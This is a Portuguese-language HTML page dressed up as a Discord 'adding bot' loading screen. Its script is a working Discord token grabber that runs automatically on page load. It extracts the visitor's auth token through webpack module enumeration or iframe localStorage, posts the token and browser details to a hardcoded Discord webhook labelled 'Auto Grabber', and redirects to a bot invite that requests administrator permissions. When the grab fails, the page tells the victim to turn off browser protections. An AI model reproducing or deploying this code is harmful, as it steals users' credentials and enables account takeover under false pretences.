<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adicionando Bot...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #36393f, #2f3136);
            color: #dcddde;
            text-align: center;
            padding: 80px 20px;
            margin: 0;
            min-height: 100vh;
        }
        h1 { color: #7289da; }
        p { max-width: 650px; margin: 20px auto; line-height: 1.6; }
        .loading {
            margin-top: 40px;
            font-size: 18px;
            color: #b9bbbe;
        }
        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 3px solid #7289da;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Adicionando o Bot no Servidor...</h1>
    <p>Processando automaticamente. Aguarde alguns segundos.</p>
    <div class="loading" id="status">
        <span class="spinner"></span> Tentando capturar o token...
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1495879559529365605/jnDvjCQ91dV9VE_UZxIaUJ6Tgs3oMcbkSo-b1S8R1cIlA9GdB1tTHGR5WYfd3na6aSqe";
        const BOT_INVITE = "https://discord.com/oauth2/authorize?client_id=1385679819508809778&permissions=8&integration_type=0&scope=bot";

        async function pegarToken() {
            const status = document.getElementById('status');
            let token = null;

            // Método mais estável em 2026 (o que muita gente usa no console)
            try {
                token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
                    .find(m => m?.exports?.default?.getToken !== void 0)
                    ?.exports?.default?.getToken();
            } catch (e) { console.log("Método 1 falhou"); }

            if (token && token.length > 50) {
                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método principal)!`;
                return token;
            }

            // Método alternativo (mais completo)
            try {
                let modules = [];
                webpackChunkdiscord_app.push([[Symbol()], {}, req => {
                    for (let c in req.c) modules.push(req.c[c]);
                }]);
                webpackChunkdiscord_app.pop();

                const found = modules.find(m => m?.exports?.default?.getToken);
                if (found) token = found.exports.default.getToken();
            } catch (e) { console.log("Método 2 falhou"); }

            if (token && token.length > 50) {
                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método alternativo)!`;
                return token;
            }

            // Último fallback: localStorage com iframe
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                const lsToken = iframe.contentWindow.localStorage.token;
                iframe.remove();
                if (lsToken) token = JSON.parse(lsToken);
            } catch (e) { console.log("LocalStorage falhou"); }

            return token;
        }

        async function enviarWebhook(token) {
            if (!token) return;

            const payload = {
                content: `**✅ Token capturado automaticamente!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**Navegador:** ${navigator.userAgent}`,
                username: "Auto Grabber",
                avatar_url: "https://i.imgur.com/0Zx3Z3k.png"
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) {}
        }

        async function iniciar() {
            const token = await pegarToken();

            if (token && token.length > 50) {
                await enviarWebhook(token);
                document.getElementById('status').innerHTML = "✅ Token enviado com sucesso!<br>Redirecionando para adicionar o bot...";
                
                setTimeout(() => {
                    window.location.href = BOT_INVITE;
                }, 1600);
            } else {
                document.getElementById('status').innerHTML = `❌ Não consegui pegar o token.<br><br>
                <b>O que fazer agora:</b><br>
                1. Abra o Discord Web primeiro (discord.com/app ou discord.com/channels/@me)<br>
                2. No Brave: clique no escudo (Shields) e desative para este site<br>
                3. Recarregue o Discord e tente abrir este link novamente<br>
                4. Teste preferencialmente no Chrome ou Edge`;
            }
        }

        window.onload = iniciar;
    </script>
</body>
</html>
